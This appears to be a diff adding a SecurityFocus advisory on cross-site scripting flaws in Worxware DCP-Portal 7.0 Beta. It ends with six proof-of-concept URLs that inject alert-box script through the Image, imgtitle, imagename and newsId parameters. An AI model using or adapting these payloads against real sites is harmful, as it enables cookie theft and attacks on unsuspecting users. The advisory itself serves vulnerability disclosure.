@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/41453/info
+
+Worxware DCP-Portal is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+DCP-Portal 7.0 Beta is vulnerable; other versions may also be affected. 
+
+http://www.example.com/common/components/editor/insert_image.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
+http://www.example.com/modules/newsletter/insert_image.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
+http://www.example.com/php/editor.php?MyAction=Delete&Image=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
+http://www.example.com/modules/gallery/view_img.php?imgtitle=%3C/title%3E%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
+http://www.example.com/modules/gallery/view_img.php?imagename=%22&#039;);window.alert(&#039;XSS&#039;);document.write(&#039;%22
+http://www.example.com/modules/tips/show_tip.php?newsId=%3Cscript%3Ewindow.alert(String.fromCharCode(88,83,83));%3C/script%3E
